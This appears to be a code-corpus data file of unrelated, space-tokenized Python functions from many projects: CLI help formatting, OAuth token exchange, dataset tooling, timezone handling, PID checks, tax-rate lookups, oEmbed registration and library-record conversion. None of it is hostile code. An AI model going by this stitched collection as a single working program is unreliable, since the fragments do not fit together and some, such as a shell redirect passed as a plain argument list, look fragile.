def optionhelp ( self , indent = 0 , maxindent = 25 , width = 79 ) : def makelabels ( option ) : labels = '%*s--%s' % ( indent , ' ' , option . name ) if option . abbreviation : labels += ', -' + option . abbreviation return labels + ': ' docs = [ ] helpindent = _autoindent ( [ makelabels ( o ) for o in self . options . values ( ) ] , indent , maxindent ) for name in self . option_order : option = self . options [ name ] labels = makelabels ( option ) helpstring = "%s(%s). %s" % ( option . formatname , option . strvalue , option . docs ) wrapped = self . _wrap_labelled ( labels , helpstring , helpindent , width ) docs . extend ( wrapped ) return '\n' . join ( docs )
def posarghelp ( self , indent = 0 , maxindent = 25 , width = 79 ) : docs = [ ] makelabel = lambda posarg : ' ' * indent + posarg . displayname + ': ' helpindent = _autoindent ( [ makelabel ( p ) for p in self . positional_args ] , indent , maxindent ) for posarg in self . positional_args : label = makelabel ( posarg ) text = posarg . formatname + '. ' + posarg . docs wrapped = self . _wrap_labelled ( label , text , helpindent , width ) docs . extend ( wrapped ) return '\n' . join ( docs )
def parse ( self , file ) : if isinstance ( file , basestring ) : file = open ( file ) line_number = 0 label = None block = self . untagged for line in file : line_number += 1 line = line . rstrip ( '\n' ) if self . tabsize > 0 : line = line . replace ( '\t' , ' ' * self . tabsize ) if self . decommenter : line = self . decommenter . decomment ( line ) if line is None : continue tag = line . split ( ':' , 1 ) [ 0 ] . strip ( ) # Still in the same block? if tag not in self . names : if block is None : if line and not line . isspace ( ) : raise ParseError ( file . name , line , "garbage before first block: %r" % line ) continue block . addline ( line ) continue # Open a new block. name = self . names [ tag ] label = line . split ( ':' , 1 ) [ 1 ] . strip ( ) if name in self . labelled_classes : if not label : raise ParseError ( file . name , line , "missing label for %r block" % name ) block = self . blocks [ name ] . setdefault ( label , self . labelled_classes [ name ] ( ) ) else : if label : msg = "label %r present for unlabelled block %r" % ( label , name ) raise ParseError ( file . name , line_number , msg ) block = self . blocks [ name ] block . startblock ( )
def get_separator ( self , i ) : return i and self . separator [ min ( i - 1 , len ( self . separator ) - 1 ) ] or ''
def authorize_url ( self ) : auth_url = OAUTH_ROOT + '/authorize' params = { 'client_id' : self . client_id , 'redirect_uri' : self . redirect_uri , } return "{}?{}" . format ( auth_url , urlencode ( params ) )
def exchange_token ( self , code ) : access_token_url = OAUTH_ROOT + '/access_token' params = { 'client_id' : self . client_id , 'client_secret' : self . client_secret , 'redirect_uri' : self . redirect_uri , 'code' : code , } resp = requests . get ( access_token_url , params = params ) if not resp . ok : raise MixcloudOauthError ( "Could not get access token." ) return resp . json ( ) [ 'access_token' ]
def acquire ( self , * args , * * kwargs ) : with self . _stat_lock : self . _waiting += 1 self . _lock . acquire ( * args , * * kwargs ) with self . _stat_lock : self . _locked = True self . _waiting -= 1
def release ( self ) : self . _lock . release ( ) with self . _stat_lock : self . _locked = False self . _last_released = datetime . now ( )
def default_decoder ( self , obj ) : typename , marshalled_state = self . unwrap_callback ( obj ) if typename is None : return obj try : cls , unmarshaller = self . serializer . unmarshallers [ typename ] except KeyError : raise LookupError ( 'no unmarshaller found for type "{}"' . format ( typename ) ) from None if cls is not None : instance = cls . __new__ ( cls ) unmarshaller ( instance , marshalled_state ) return instance else : return unmarshaller ( marshalled_state )
def create ( quiet , name , base_uri , symlink_path ) : _validate_name ( name ) admin_metadata = dtoolcore . generate_admin_metadata ( name ) parsed_base_uri = dtoolcore . utils . generous_parse_uri ( base_uri ) if parsed_base_uri . scheme == "symlink" : if symlink_path is None : raise click . UsageError ( "Need to specify symlink path using the -s/--symlink-path option" ) # NOQA if symlink_path : base_uri = dtoolcore . utils . sanitise_uri ( "symlink:" + parsed_base_uri . path ) parsed_base_uri = dtoolcore . utils . generous_parse_uri ( base_uri ) # Create the dataset. proto_dataset = dtoolcore . generate_proto_dataset ( admin_metadata = admin_metadata , base_uri = dtoolcore . utils . urlunparse ( parsed_base_uri ) , config_path = CONFIG_PATH ) # If we are creating a symlink dataset we need to set the symlink_path # attribute on the storage broker. if symlink_path : symlink_abspath = os . path . abspath ( symlink_path ) proto_dataset . _storage_broker . symlink_path = symlink_abspath try : proto_dataset . create ( ) except dtoolcore . storagebroker . StorageBrokerOSError as err : raise click . UsageError ( str ( err ) ) proto_dataset . put_readme ( "" ) if quiet : click . secho ( proto_dataset . uri ) else : # Give the user some feedback and hints on what to do next. click . secho ( "Created proto dataset " , nl = False , fg = "green" ) click . secho ( proto_dataset . uri ) click . secho ( "Next steps: " ) step = 1 if parsed_base_uri . scheme != "symlink" : click . secho ( "{}. Add raw data, eg:" . format ( step ) ) click . secho ( "   dtool add item my_file.txt {}" . format ( proto_dataset . uri ) , fg = "cyan" ) if parsed_base_uri . scheme == "file" : # Find the abspath of the data directory for user feedback. data_path = proto_dataset . _storage_broker . _data_abspath click . secho ( "   Or use your system commands, e.g: " ) click . secho ( "   mv my_data_directory {}/" . format ( data_path ) , fg = "cyan" ) step = step + 1 click . secho ( "{}. Add descriptive metadata, e.g: " . format ( step ) ) click . secho ( "   dtool readme interactive {}" . format ( proto_dataset . uri ) , fg = "cyan" ) step = step + 1 click . secho ( "{}. Convert the proto dataset into a dataset: " . format ( step ) ) click . secho ( "   dtool freeze {}" . format ( proto_dataset . uri ) , fg = "cyan" )
def interactive ( proto_dataset_uri ) : proto_dataset = dtoolcore . ProtoDataSet . from_uri ( uri = proto_dataset_uri , config_path = CONFIG_PATH ) # Create an CommentedMap representation of the yaml readme template. readme_template = _get_readme_template ( ) yaml = YAML ( ) yaml . explicit_start = True yaml . indent ( mapping = 2 , sequence = 4 , offset = 2 ) descriptive_metadata = yaml . load ( readme_template ) descriptive_metadata = _prompt_for_values ( descriptive_metadata ) # Write out the descriptive metadata to the readme file. stream = StringIO ( ) yaml . dump ( descriptive_metadata , stream ) proto_dataset . put_readme ( stream . getvalue ( ) ) click . secho ( "Updated readme " , fg = "green" ) click . secho ( "To edit the readme using your default editor:" ) click . secho ( "dtool readme edit {}" . format ( proto_dataset_uri ) , fg = "cyan" )
def edit ( dataset_uri ) : try : dataset = dtoolcore . ProtoDataSet . from_uri ( uri = dataset_uri , config_path = CONFIG_PATH ) except dtoolcore . DtoolCoreTypeError : dataset = dtoolcore . DataSet . from_uri ( uri = dataset_uri , config_path = CONFIG_PATH ) readme_content = dataset . get_readme_content ( ) try : # Python2 compatibility. readme_content = unicode ( readme_content , "utf-8" ) except NameError : pass edited_content = click . edit ( readme_content ) if edited_content is not None : _validate_and_put_readme ( dataset , edited_content ) click . secho ( "Updated readme " , nl = False , fg = "green" ) else : click . secho ( "Did not update readme " , nl = False , fg = "red" ) click . secho ( dataset_uri )
def show ( dataset_uri ) : try : dataset = dtoolcore . ProtoDataSet . from_uri ( uri = dataset_uri , config_path = CONFIG_PATH ) except dtoolcore . DtoolCoreTypeError : dataset = dtoolcore . DataSet . from_uri ( uri = dataset_uri , config_path = CONFIG_PATH ) readme_content = dataset . get_readme_content ( ) click . secho ( readme_content )
def item ( proto_dataset_uri , input_file , relpath_in_dataset ) : proto_dataset = dtoolcore . ProtoDataSet . from_uri ( proto_dataset_uri , config_path = CONFIG_PATH ) if relpath_in_dataset == "" : relpath_in_dataset = os . path . basename ( input_file ) proto_dataset . put_item ( input_file , relpath_in_dataset )
def metadata ( proto_dataset_uri , relpath_in_dataset , key , value ) : proto_dataset = dtoolcore . ProtoDataSet . from_uri ( uri = proto_dataset_uri , config_path = CONFIG_PATH ) proto_dataset . add_item_metadata ( handle = relpath_in_dataset , key = key , value = value )
def cp ( resume , quiet , dataset_uri , dest_base_uri ) : _copy ( resume , quiet , dataset_uri , dest_base_uri )
def fromutc ( self , dt ) : if not isinstance ( dt , datetime ) : raise TypeError ( "fromutc() requires a datetime argument" ) if dt . tzinfo is not self : raise ValueError ( "dt.tzinfo is not self" ) # Get transitions - if there are none, fixed offset transitions = self . transitions ( dt . year ) if transitions is None : return dt + self . utcoffset ( dt ) # Get the transition times in UTC dston , dstoff = transitions dston -= self . _std_offset dstoff -= self . _std_offset utc_transitions = ( dston , dstoff ) dt_utc = dt . replace ( tzinfo = None ) isdst = self . _naive_isdst ( dt_utc , utc_transitions ) if isdst : dt_wall = dt + self . _dst_offset else : dt_wall = dt + self . _std_offset _fold = int ( not isdst and self . is_ambiguous ( dt_wall ) ) return enfold ( dt_wall , fold = _fold )
def strip_comment_line_with_symbol ( line , start ) : parts = line . split ( start ) counts = [ len ( findall ( r'(?:^|[^"\\]|(?:\\\\|\\")+)(")' , part ) ) for part in parts ] total = 0 for nr , count in enumerate ( counts ) : total += count if total % 2 == 0 : return start . join ( parts [ : nr + 1 ] ) . rstrip ( ) else : # pragma: no cover return line . rstrip ( )
def picknthweekday ( year , month , dayofweek , hour , minute , whichweek ) : first = datetime . datetime ( year , month , 1 , hour , minute ) # This will work if dayofweek is ISO weekday (1-7) or Microsoft-style (0-6), # Because 7 % 7 = 0 weekdayone = first . replace ( day = ( ( dayofweek - first . isoweekday ( ) ) % 7 ) + 1 ) wd = weekdayone + ( ( whichweek - 1 ) * ONEWEEK ) if ( wd . month != month ) : wd -= ONEWEEK return wd
def valuestodict ( key ) : dout = { } size = winreg . QueryInfoKey ( key ) [ 1 ] tz_res = None for i in range ( size ) : key_name , value , dtype = winreg . EnumValue ( key , i ) if dtype == winreg . REG_DWORD or dtype == winreg . REG_DWORD_LITTLE_ENDIAN : # If it's a DWORD (32-bit integer), it's stored as unsigned - convert # that to a proper signed integer if value & ( 1 << 31 ) : value = value - ( 1 << 32 ) elif dtype == winreg . REG_SZ : # If it's a reference to the tzres DLL, load the actual string if value . startswith ( '@tzres' ) : tz_res = tz_res or tzres ( ) value = tz_res . name_from_string ( value ) value = value . rstrip ( '\x00' ) # Remove trailing nulls dout [ key_name ] = value return dout
def _set_tzdata ( self , tzobj ) : # Copy the relevant attributes over as private attributes for attr in _tzfile . attrs : setattr ( self , '_' + attr , getattr ( tzobj , attr ) )
def get ( self , request , hash , filename ) : if _ws_download is True : return HttpResponseForbidden ( ) upload = Upload . objects . uploaded ( ) . get ( hash = hash , name = filename ) return FileResponse ( upload . file , content_type = upload . type )
def camelize_classname ( base , tablename , table ) : "'words_and_underscores' -> 'WordsAndUnderscores'" return str ( tablename [ 0 ] . upper ( ) + re . sub ( r'_([a-z])' , lambda m : m . group ( 1 ) . upper ( ) , tablename [ 1 : ] ) )
def pluralize_collection ( base , local_cls , referred_cls , constraint ) : "'SomeTerm' -> 'some_terms'" referred_name = referred_cls . __name__ uncamelized = re . sub ( r'[A-Z]' , lambda m : "_%s" % m . group ( 0 ) . lower ( ) , referred_name ) [ 1 : ] pluralized = _pluralizer . plural ( uncamelized ) return pluralized
def dump_deque ( self , obj , class_name = "collections.deque" ) : return { "$" + class_name : [ self . _json_convert ( item ) for item in obj ] }
def dump_OrderedDict ( self , obj , class_name = "collections.OrderedDict" ) : return { "$" + class_name : [ ( key , self . _json_convert ( value ) ) for key , value in iteritems ( obj ) ] }
def dump_nparray ( self , obj , class_name = numpy_ndarray_class_name ) : return { "$" + class_name : self . _json_convert ( obj . tolist ( ) ) }
def join ( prev , sep , * args , * * kw ) : yield sep . join ( prev , * args , * * kw )
def substitute ( prev , * args , * * kw ) : template_obj = string . Template ( * args , * * kw ) for data in prev : yield template_obj . substitute ( data )
def safe_substitute ( prev , * args , * * kw ) : template_obj = string . Template ( * args , * * kw ) for data in prev : yield template_obj . safe_substitute ( data )
def to_str ( prev , encoding = None ) : first = next ( prev ) if isinstance ( first , str ) : if encoding is None : yield first for s in prev : yield s else : yield first . encode ( encoding ) for s in prev : yield s . encode ( encoding ) else : if encoding is None : encoding = sys . stdout . encoding or 'utf-8' yield first . decode ( encoding ) for s in prev : yield s . decode ( encoding )
def register_default_types ( ) : register_type ( type , pipe . map ) register_type ( types . FunctionType , pipe . map ) register_type ( types . MethodType , pipe . map ) register_type ( tuple , seq ) register_type ( list , seq ) register_type ( types . GeneratorType , seq ) register_type ( string_type , sh ) register_type ( unicode_type , sh ) register_type ( file_type , fileobj ) if is_py3 : register_type ( range , seq ) register_type ( map , seq )
def check_pidfile ( pidfile , debug ) : # Check PID exists and see if the PID is running if os . path . isfile ( pidfile ) : pidfile_handle = open ( pidfile , 'r' ) # try and read the PID file. If no luck, remove it try : pid = int ( pidfile_handle . read ( ) ) pidfile_handle . close ( ) if check_pid ( pid , debug ) : return True except : pass # PID is not active, remove the PID file os . unlink ( pidfile ) # Create a PID file, to ensure this is script is only run once (at a time) pid = str ( os . getpid ( ) ) open ( pidfile , 'w' ) . write ( pid ) return False
def check_pid ( pid , debug ) : try : # A Kill of 0 is to check if the PID is active. It won't kill the process os . kill ( pid , 0 ) if debug > 1 : print ( "Script has a PIDFILE where the process is still running" ) return True except OSError : if debug > 1 : print ( "Script does not appear to be running" ) return False
def convert_words_to_uint ( high_word , low_word ) : try : low_num = int ( low_word ) # low_word might arrive as a signed number. Convert to unsigned if low_num < 0 : low_num = abs ( low_num ) + 2 ** 15 number = ( int ( high_word ) << 16 ) | low_num return number , True except : return 0 , False
def convert_words_to_float ( high_word , low_word ) : number , retval = convert_words_to_uint ( high_word , low_word ) if not retval : return 0.0 , False try : packed_float = struct . pack ( '>l' , number ) return struct . unpack ( '>f' , packed_float ) [ 0 ] , True except : return 0.0 , False
def disown ( debug ) : # Get the current PID pid = os . getpid ( ) cgroup_file = "/proc/" + str ( pid ) + "/cgroup" try : infile = open ( cgroup_file , "r" ) except IOError : print ( "Could not open cgroup file: " , cgroup_file ) return False # Read each line for line in infile : # Check if the line contains "ardexa.service" if line . find ( "ardexa.service" ) == - 1 : continue # if the lines contains "name=", replace it with nothing line = line . replace ( "name=" , "" ) # Split  the line by commas items_list = line . split ( ':' ) accounts = items_list [ 1 ] dir_str = accounts + "/ardexa.disown" # If accounts is empty, continue if not accounts : continue # Create the dir and all subdirs full_dir = "/sys/fs/cgroup/" + dir_str if not os . path . exists ( full_dir ) : os . makedirs ( full_dir ) if debug >= 1 : print ( "Making directory: " , full_dir ) else : if debug >= 1 : print ( "Directory already exists: " , full_dir ) # Add the PID to the file full_path = full_dir + "/cgroup.procs" prog_list = [ "echo" , str ( pid ) , ">" , full_path ] run_program ( prog_list , debug , True ) # If this item contains a comma, then separate it, and reverse # some OSes will need cpuacct,cpu reversed to actually work if accounts . find ( "," ) != - 1 : acct_list = accounts . split ( ',' ) accounts = acct_list [ 1 ] + "," + acct_list [ 0 ] dir_str = accounts + "/ardexa.disown" # Create the dir and all subdirs. But it may not work. So use a TRY full_dir = "/sys/fs/cgroup/" + dir_str try : if not os . path . exists ( full_dir ) : os . makedirs ( full_dir ) except : continue # Add the PID to the file full_path = full_dir + "/cgroup.procs" prog_list = [ "echo" , str ( pid ) , ">" , full_path ] run_program ( prog_list , debug , True ) infile . close ( ) # For debug purposes only if debug >= 1 : prog_list = [ "cat" , cgroup_file ] run_program ( prog_list , debug , False ) # If there are any "ardexa.service" in the proc file. If so, exit with error prog_list = [ "grep" , "-q" , "ardexa.service" , cgroup_file ] if run_program ( prog_list , debug , False ) : # There are entries still left in the file return False return True
def _encode_ids ( * args ) : ids = [ ] for v in args : if isinstance ( v , basestring ) : qv = v . encode ( 'utf-8' ) if isinstance ( v , unicode ) else v ids . append ( urllib . quote ( qv ) ) else : qv = str ( v ) ids . append ( urllib . quote ( qv ) ) return ';' . join ( ids )
def flush ( self , line ) : # TODO -- maybe use echo? sys . stdout . write ( line ) sys . stdout . flush ( )
def find_meta ( * meta_file_parts , meta_key ) : meta_file = read ( * meta_file_parts ) meta_match = re . search ( r"^__{}__ = ['\"]([^'\"]*)['\"]" . format ( meta_key ) , meta_file , re . M ) if meta_match : return meta_match . group ( 1 ) raise RuntimeError ( "Unable to find __{}__ string." . format ( meta_key ) )
def main ( path ) : basepath = os . path . abspath ( os . path . expanduser ( str ( path ) ) ) echo . h2 ( "Available scripts in {}" . format ( basepath ) ) echo . br ( ) for root_dir , dirs , files in os . walk ( basepath , topdown = True ) : for f in fnmatch . filter ( files , '*.py' ) : try : filepath = os . path . join ( root_dir , f ) # super edge case, this makes sure the python script won't start # an interactive console session which would cause the session # to start and not allow the for loop to complete with open ( filepath , encoding = "UTF-8" ) as fp : body = fp . read ( ) is_console = "InteractiveConsole" in body is_console = is_console or "code" in body is_console = is_console and "interact(" in body if is_console : continue s = captain . Script ( filepath ) if s . can_run_from_cli ( ) : rel_filepath = s . call_path ( basepath ) p = s . parser echo . h3 ( rel_filepath ) desc = p . description if desc : echo . indent ( desc , indent = ( " " * 4 ) ) subcommands = s . subcommands if subcommands : echo . br ( ) echo . indent ( "Subcommands:" , indent = ( " " * 4 ) ) for sc in subcommands . keys ( ) : echo . indent ( sc , indent = ( " " * 6 ) ) echo . br ( ) except captain . ParseError : pass except Exception as e : #echo.exception(e) #echo.err("Failed to parse {} because {}", f, e.message) echo . err ( "Failed to parse {}" , f ) echo . verbose ( e . message ) echo . br ( )
def make_request_data ( self , zipcode , city , state ) : data = { 'key' : self . api_key , 'postalcode' : str ( zipcode ) , 'city' : city , 'state' : state } data = ZipTaxClient . _clean_request_data ( data ) return data
def process_response ( self , resp , multiple_rates ) : self . _check_for_exceptions ( resp , multiple_rates ) rates = { } for result in resp [ 'results' ] : rate = ZipTaxClient . _cast_tax_rate ( result [ 'taxSales' ] ) rates [ result [ 'geoCity' ] ] = rate if not multiple_rates : return rates [ list ( rates . keys ( ) ) [ 0 ] ] return rates
def _check_for_exceptions ( self , resp , multiple_rates ) : if resp [ 'rCode' ] != 100 : raise exceptions . get_exception_for_code ( resp [ 'rCode' ] ) ( resp ) results = resp [ 'results' ] if len ( results ) == 0 : raise exceptions . ZipTaxNoResults ( 'No results found' ) if len ( results ) > 1 and not multiple_rates : # It's fine if all the taxes are the same rates = [ result [ 'taxSales' ] for result in results ] if len ( set ( rates ) ) != 1 : raise exceptions . ZipTaxMultipleResults ( 'Multiple results found but requested only one' )
def get_all_text ( node ) : if node . nodeType == node . TEXT_NODE : return node . data else : text_string = "" for child_node in node . childNodes : text_string += get_all_text ( child_node ) return text_string
def _extract_packages ( self ) : self . path_unpacked = mkdtemp ( prefix = "scoap3_package_" , dir = CFG_TMPSHAREDDIR ) for path in self . retrieved_packages_unpacked : scoap3utils_extract_package ( path , self . path_unpacked , self . logger ) return self . path_unpacked
def register ( self , provider_class ) : if not issubclass ( provider_class , BaseProvider ) : raise TypeError ( '%s is not a subclass of BaseProvider' % provider_class . __name__ ) if provider_class in self . _registered_providers : raise AlreadyRegistered ( '%s is already registered' % provider_class . __name__ ) if issubclass ( provider_class , DjangoProvider ) : # set up signal handler for cache invalidation signals . post_save . connect ( self . invalidate_stored_oembeds , sender = provider_class . _meta . model ) # don't build the regex yet - if not all urlconfs have been loaded # and processed at this point, the DjangoProvider instances will fail # when attempting to reverse urlpatterns that haven't been created. # Rather, the regex-list will be populated once, on-demand. self . _registered_providers . append ( provider_class ) # flag for re-population self . invalidate_providers ( )
def unregister ( self , provider_class ) : if not issubclass ( provider_class , BaseProvider ) : raise TypeError ( '%s must be a subclass of BaseProvider' % provider_class . __name__ ) if provider_class not in self . _registered_providers : raise NotRegistered ( '%s is not registered' % provider_class . __name__ ) self . _registered_providers . remove ( provider_class ) # flag for repopulation self . invalidate_providers ( )
def provider_for_url ( self , url ) : for provider , regex in self . get_registry ( ) . items ( ) : if re . match ( regex , url ) is not None : return provider raise OEmbedMissingEndpoint ( 'No endpoint matches URL: %s' % url )
def invalidate_stored_oembeds ( self , sender , instance , created , * * kwargs ) : ctype = ContentType . objects . get_for_model ( instance ) StoredOEmbed . objects . filter ( object_id = instance . pk , content_type = ctype ) . delete ( )
def embed ( self , url , * * kwargs ) : try : # first figure out the provider provider = self . provider_for_url ( url ) except OEmbedMissingEndpoint : raise else : try : # check the database for a cached response, because of certain # race conditions that exist with get_or_create(), do a filter # lookup and just grab the first item stored_match = StoredOEmbed . objects . filter ( match = url , maxwidth = kwargs . get ( 'maxwidth' , None ) , maxheight = kwargs . get ( 'maxheight' , None ) , date_expires__gte = datetime . datetime . now ( ) ) [ 0 ] return OEmbedResource . create_json ( stored_match . response_json ) except IndexError : # query the endpoint and cache response in db # prevent None from being passed in as a GET param params = dict ( [ ( k , v ) for k , v in kwargs . items ( ) if v ] ) # request an oembed resource for the url resource = provider . request_resource ( url , * * params ) try : cache_age = int ( resource . cache_age ) if cache_age < MIN_OEMBED_TTL : cache_age = MIN_OEMBED_TTL except : cache_age = DEFAULT_OEMBED_TTL date_expires = datetime . datetime . now ( ) + datetime . timedelta ( seconds = cache_age ) stored_oembed , created = StoredOEmbed . objects . get_or_create ( match = url , maxwidth = kwargs . get ( 'maxwidth' , None ) , maxheight = kwargs . get ( 'maxheight' , None ) ) stored_oembed . response_json = resource . json stored_oembed . resource_type = resource . type stored_oembed . date_expires = date_expires if resource . content_object : stored_oembed . content_object = resource . content_object stored_oembed . save ( ) return resource
def autodiscover ( self , url ) : headers , response = fetch_url ( url ) if headers [ 'content-type' ] . split ( ';' ) [ 0 ] in ( 'application/json' , 'text/javascript' ) : provider_data = json . loads ( response ) return self . store_providers ( provider_data )
def store_providers ( self , provider_data ) : if not hasattr ( provider_data , '__iter__' ) : raise OEmbedException ( 'Autodiscovered response not iterable' ) provider_pks = [ ] for provider in provider_data : if 'endpoint' not in provider or 'matches' not in provider : continue resource_type = provider . get ( 'type' ) if resource_type not in RESOURCE_TYPES : continue stored_provider , created = StoredProvider . objects . get_or_create ( wildcard_regex = provider [ 'matches' ] ) if created : stored_provider . endpoint_url = relative_to_full ( provider [ 'endpoint' ] , provider [ 'matches' ] ) stored_provider . resource_type = resource_type stored_provider . save ( ) provider_pks . append ( stored_provider . pk ) return StoredProvider . objects . filter ( pk__in = provider_pks )
def _image_field ( self ) : for field in self . model . _meta . fields : if isinstance ( field , ImageField ) : return field . name
def _date_field ( self ) : for field in self . model . _meta . fields : if isinstance ( field , ( DateTimeField , DateField ) ) : return field . name
def get_image ( self , obj ) : if self . _meta . image_field : return getattr ( obj , self . _meta . image_field )
def map_to_dictionary ( self , url , obj , * * kwargs ) : maxwidth = kwargs . get ( 'maxwidth' , None ) maxheight = kwargs . get ( 'maxheight' , None ) provider_url , provider_name = self . provider_from_url ( url ) mapping = { 'version' : '1.0' , 'url' : url , 'provider_name' : provider_name , 'provider_url' : provider_url , 'type' : self . resource_type } # a hook self . preprocess ( obj , mapping , * * kwargs ) # resize image if we have a photo, otherwise use the given maximums if self . resource_type == 'photo' and self . get_image ( obj ) : self . resize_photo ( obj , mapping , maxwidth , maxheight ) elif self . resource_type in ( 'video' , 'rich' , 'photo' ) : width , height = size_to_nearest ( maxwidth , maxheight , self . _meta . valid_sizes , self . _meta . force_fit ) mapping . update ( width = width , height = height ) # create a thumbnail if self . get_image ( obj ) : self . thumbnail ( obj , mapping ) # map attributes to the mapping dictionary.  if the attribute is # a callable, it must have an argument signature of # (self, obj) for attr in ( 'title' , 'author_name' , 'author_url' , 'html' ) : self . map_attr ( mapping , attr , obj ) # fix any urls if 'url' in mapping : mapping [ 'url' ] = relative_to_full ( mapping [ 'url' ] , url ) if 'thumbnail_url' in mapping : mapping [ 'thumbnail_url' ] = relative_to_full ( mapping [ 'thumbnail_url' ] , url ) if 'html' not in mapping and mapping [ 'type' ] in ( 'video' , 'rich' ) : mapping [ 'html' ] = self . render_html ( obj , context = Context ( mapping ) ) # a hook self . postprocess ( obj , mapping , * * kwargs ) return mapping
def get_record ( self ) : self . recid = self . get_recid ( ) self . remove_controlfields ( ) self . update_system_numbers ( ) self . add_systemnumber ( "Inspire" , recid = self . recid ) self . add_control_number ( "003" , "SzGeCERN" ) self . update_collections ( ) self . update_languages ( ) self . update_reportnumbers ( ) self . update_authors ( ) self . update_journals ( ) self . update_subject_categories ( "INSPIRE" , "SzGeCERN" , "categories_cds" ) self . update_pagenumber ( ) self . update_notes ( ) self . update_experiments ( ) self . update_isbn ( ) self . update_dois ( ) self . update_links_and_ffts ( ) self . update_date ( ) self . update_date_year ( ) self . update_hidden_notes ( ) self . update_oai_info ( ) self . update_cnum ( ) self . update_conference_info ( ) self . fields_list = [ "909" , "541" , "961" , "970" , "690" , "695" , "981" , ] self . strip_fields ( ) if "ANNOUNCEMENT" in self . collections : self . update_conference_111 ( ) self . update_conference_links ( ) record_add_field ( self . record , "690" , ind1 = "C" , subfields = [ ( "a" , "CONFERENCE" ) ] ) if "THESIS" in self . collections : self . update_thesis_information ( ) self . update_thesis_supervisors ( ) if "PROCEEDINGS" in self . collections : # Special proceeding syntax self . update_title_to_proceeding ( ) self . update_author_to_proceeding ( ) record_add_field ( self . record , "690" , ind1 = "C" , subfields = [ ( "a" , "CONFERENCE" ) ] ) # 690 tags if self . tag_as_cern : record_add_field ( self . record , "690" , ind1 = "C" , subfields = [ ( "a" , "CERN" ) ] ) return self . record
def update_oai_info ( self ) : for field in record_get_field_instances ( self . record , '909' , ind1 = "C" , ind2 = "O" ) : new_subs = [ ] for tag , value in field [ 0 ] : if tag == "o" : new_subs . append ( ( "a" , value ) ) else : new_subs . append ( ( tag , value ) ) if value in [ "CERN" , "CDS" , "ForCDS" ] : self . tag_as_cern = True record_add_field ( self . record , '024' , ind1 = "8" , subfields = new_subs ) record_delete_fields ( self . record , '909' )
def update_cnum ( self ) : if "ConferencePaper" not in self . collections : cnums = record_get_field_values ( self . record , '773' , code = "w" ) for cnum in cnums : cnum_subs = [ ( "9" , "INSPIRE-CNUM" ) , ( "a" , cnum ) ] record_add_field ( self . record , "035" , subfields = cnum_subs )
def update_hidden_notes ( self ) : if not self . tag_as_cern : notes = record_get_field_instances ( self . record , tag = "595" ) for field in notes : for dummy , value in field [ 0 ] : if value == "CDS" : self . tag_as_cern = True record_delete_fields ( self . record , tag = "595" )
def update_collections ( self ) : for value in record_get_field_values ( self . record , '980' , code = 'a' ) : if 'NOTE' in value . upper ( ) : self . collections . add ( 'NOTE' ) if 'THESIS' in value . upper ( ) : self . collections . add ( 'THESIS' ) if 'PUBLISHED' in value . upper ( ) : self . collections . add ( 'ARTICLE' ) if 'CONFERENCES' in value . upper ( ) : self . collections . add ( 'ANNOUNCEMENT' ) if 'PROCEEDINGS' in value . upper ( ) : self . collections . add ( 'PROCEEDINGS' ) elif 'CONFERENCEPAPER' in value . upper ( ) and "ConferencePaper" not in self . collections : self . collections . add ( 'ConferencePaper' ) if self . is_published ( ) and "ARTICLE" not in self . collections : self . collections . add ( 'ARTICLE' ) else : self . collections . add ( 'PREPRINT' ) if "HIDDEN" in value . upper ( ) : self . hidden = True # Clear out any existing ones. record_delete_fields ( self . record , "980" ) if not self . collections : self . collections . add ( 'PREPRINT' ) for collection in self . collections : record_add_field ( self . record , tag = '980' , subfields = [ ( 'a' , collection ) ] ) if collection in self . collection_base : subs = [ ( 'a' , self . collection_base [ collection ] ) ] record_add_field ( self . record , tag = '960' , subfields = subs )
def update_notes ( self ) : fields = record_get_field_instances ( self . record , '500' ) for field in fields : subs = field_get_subfields ( field ) for sub in subs . get ( 'a' , [ ] ) : sub = sub . strip ( ) # remove any spaces before/after if sub . startswith ( "*" ) and sub . endswith ( "*" ) : record_delete_field ( self . record , tag = "500" , field_position_global = field [ 4 ] )
def update_title_to_proceeding ( self ) : titles = record_get_field_instances ( self . record , tag = "245" ) for title in titles : subs = field_get_subfields ( title ) new_subs = [ ] if "a" in subs : new_subs . append ( ( "a" , subs [ 'a' ] [ 0 ] ) ) if "b" in subs : new_subs . append ( ( "c" , subs [ 'b' ] [ 0 ] ) ) record_add_field ( self . record , tag = "111" , subfields = new_subs ) record_delete_fields ( self . record , tag = "245" ) record_delete_fields ( self . record , tag = "246" )
def update_authors ( self ) : author_names = record_get_field_instances ( self . record , '100' ) author_names . extend ( record_get_field_instances ( self . record , '700' ) ) for field in author_names : subs = field_get_subfields ( field ) for idx , ( key , value ) in enumerate ( field [ 0 ] ) : if key == 'a' : field [ 0 ] [ idx ] = ( 'a' , value . replace ( "." , " " ) . strip ( ) ) elif key == 'v' : del field [ 0 ] [ idx ] if subs . get ( "u" , None ) == "CERN" : self . tag_as_cern = True
def update_isbn ( self ) : isbns = record_get_field_instances ( self . record , '020' ) for field in isbns : for idx , ( key , value ) in enumerate ( field [ 0 ] ) : if key == 'a' : field [ 0 ] [ idx ] = ( 'a' , value . replace ( "-" , "" ) . strip ( ) )
def update_dois ( self ) : dois = record_get_field_instances ( self . record , '024' , ind1 = "7" ) all_dois = { } for field in dois : subs = field_get_subfield_instances ( field ) subs_dict = dict ( subs ) if subs_dict . get ( 'a' ) : if subs_dict [ 'a' ] in all_dois : record_delete_field ( self . record , tag = '024' , ind1 = '7' , field_position_global = field [ 4 ] ) continue all_dois [ subs_dict [ 'a' ] ] = field
def update_journals ( self ) : for field in record_get_field_instances ( self . record , '773' ) : subs = field_get_subfield_instances ( field ) new_subs = [ ] volume_letter = "" journal_name = "" for idx , ( key , value ) in enumerate ( subs ) : if key == 'p' : journal_name = self . get_config_item ( value , "journals" , allow_substring = False ) # Make sure journal names have the form (dot)(space) (I know it's horrible) journal_name = journal_name . replace ( '. ' , '.' ) . replace ( '.' , '. ' ) . replace ( '. ,' , '.,' ) . strip ( ) elif key == 'v' : volume_letter = value else : new_subs . append ( ( key , value ) ) if not journal_name == "PoS" : # Special handling of journal name and volumes, except PoS letter = return_letters_from_string ( volume_letter ) if letter : journal_name = "{0} {1}" . format ( journal_name , letter ) volume_letter = volume_letter . strip ( letter ) if journal_name : new_subs . append ( ( "p" , journal_name ) ) if volume_letter : new_subs . append ( ( "v" , volume_letter ) ) record_delete_field ( self . record , tag = "773" , field_position_global = field [ 4 ] ) record_add_field ( self . record , "773" , subfields = new_subs )
